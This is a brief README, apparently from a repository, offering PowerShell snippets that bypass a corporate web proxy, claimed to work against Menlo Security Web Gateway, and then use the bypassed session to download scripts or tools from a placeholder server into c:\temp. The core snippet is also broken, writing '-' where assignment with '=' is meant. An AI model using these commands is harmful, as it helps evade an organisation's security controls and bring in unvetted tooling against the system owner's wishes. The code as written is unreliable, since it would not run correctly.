# Proxy-Bypass using PowerShell.
When PowerShell is available and you need to bypass those annoying corp proxies, give this a try. A proxy bypass using powershell. Sucecssfully used to bypass Menlo Security Web Gateway. 

## PowerShell code for proxy bypass.
```
$Proxy-New-object System.Net.WebProxy
$WebSession-new-object Microsoft.PowerShell.Commands.WebRequestSession
$WebSession.Proxy=$Proxy
```

## Test proxy bypass is working.
```
Invoke-webrequest -Uri "https://www.google.com" -WebSession $WebSession
```

## Download scripts/tooling using bypass.
```
Invoke-webrequest -Method Get -Uri "https://ServerAddress/tool.ps1" -WebSession $WebSession -outfile c:\temp\tool.ps1
```
